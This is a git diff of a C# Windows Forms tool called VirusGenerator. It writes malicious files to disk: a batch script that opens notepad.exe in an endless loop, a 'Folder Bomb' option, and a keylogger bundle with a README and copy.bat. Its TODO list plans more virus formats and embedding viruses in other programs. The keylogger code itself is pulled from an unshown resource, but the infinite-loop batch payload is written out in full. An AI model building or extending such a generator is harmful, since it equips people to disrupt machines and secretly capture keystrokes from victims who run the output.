@@ -12,7 +12,6 @@ TODO:
 1. Support '.exe' files. Learn how to compile 
 2. Support '.py' viruses
 3. Support '.ps1' viruses
-4. Keylogger virus
 5. Embed viruses in other programs.
  
 Logic:
@@ -41,6 +40,8 @@ namespace VirusGenerator
 
         // Init class level variables
         string getKeys = Properties.Resources.Get_Keystrokes;
+        string readmeKeylogger = Properties.Resources.readmeKeylogger;
+        string copyKeylogger = Properties.Resources.copyKeylogger;
 
         string _outputFolder;
         string _fileName;
@@ -68,7 +69,7 @@ namespace VirusGenerator
             if (CBoxAttack.Text == "Infinite Loop Attack" && _fileExt == ".bat")
             {
                 string[] infiniteLoopCmd = { "@echo off", ":loop", "start notepad.exe", "goto loop" };
-                System.IO.File.WriteAllLines(_outputFolder + _fileName + _fileExt, infiniteLoopCmd);
+                File.WriteAllLines(_outputFolder + _fileName + _fileExt, infiniteLoopCmd);
             }
             if (CBoxAttack.Text == "Folder Bomb Attack")
             {
@@ -80,8 +81,16 @@ namespace VirusGenerator
 
             if (CBoxAttack.Text == "Keylogger")
             {
+                string folderPath = _outputFolder + "Get-Keystokes";
+                
+                Path.Combine(folderPath, _fileName);
+                Directory.CreateDirectory(folderPath);
 
-                File.WriteAllText(_outputFolder + _fileName + _fileExt, getKeys);
+                File.WriteAllText(folderPath + "\\" + _fileName + _fileExt, getKeys);
+                File.WriteAllText(folderPath + "\\" + "README.txt", readmeKeylogger);
+                File.WriteAllText(folderPath + "\\" + "copy.bat", copyKeylogger);
+
+
             }
             
 
@@ -142,11 +151,6 @@ namespace VirusGenerator
         private void closeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Close(); //closes program from the menu stip.
-        }
-
-        private void textCompile()
-        {
-
         }
 
         private void BtnDebug_Click(object sender, EventArgs e)
